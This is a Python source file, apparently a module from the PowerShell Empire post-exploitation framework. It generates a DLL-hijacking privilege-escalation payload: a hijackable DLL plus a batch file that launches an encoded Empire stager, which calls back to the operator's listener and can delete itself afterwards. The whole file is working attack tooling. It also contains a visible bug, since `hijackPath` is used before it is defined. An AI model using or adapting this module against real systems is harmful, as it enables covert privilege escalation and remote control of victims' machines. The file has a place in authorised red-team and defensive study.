from lib.common import helpers
import os

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Write-HijackDll',

            'Author': ['leechristensen (@tifkin_)', '@harmj0y'],

            'Description': ("Writes out a hijackable .dll to the specified path "
                            "along with a stager.bat that's called by the .dll. "
                            "wlbsctrl.dll works well for Windows 7. "
                            "The machine will need to be restarted for the privesc to work."),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,
            
            'MinPSVersion' : '2',
            
            'Comments': [
                'https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'HijackPath' : {
                'Description'   :   "The output path for the hijackable .dll.",
                'Required'      :   True,
                'Value'         :   ''
            },
            'Delete' : {
                'Description'   :   "Switch. Have the launcher.bat delete itself after running.",
                'Required'      :   False,
                'Value'         :   'True'
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            } 
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        moduleName = self.info["Name"]
        
        # read in the common powerup.ps1 module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/powerup/Write-HijackDll.ps1"

        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        # get just the code needed for the specified function
        script = helpers.generate_dynamic_powershell_script(moduleCode, moduleName)

        batPath = "\\".join(hijackPath.split("\\")[0:-1]) + "\debug.bat"
        script += moduleName + " "

        # extract all of our options
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']

        if not self.mainMenu.listeners.is_listener_empire(listenerName):
            print helpers.color("[!] Empire listener required!")
            return ""

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""

        else:
            outFile = self.options['HijackPath']['Value']
            script += " -Command \"%s\"" % (launcher)
            script += " -OutputFile %s" % (outFile)

        script += ' | Out-String | %{$_ + \"`n\"};"`n'+str(moduleName)+' completed!"'

        return script
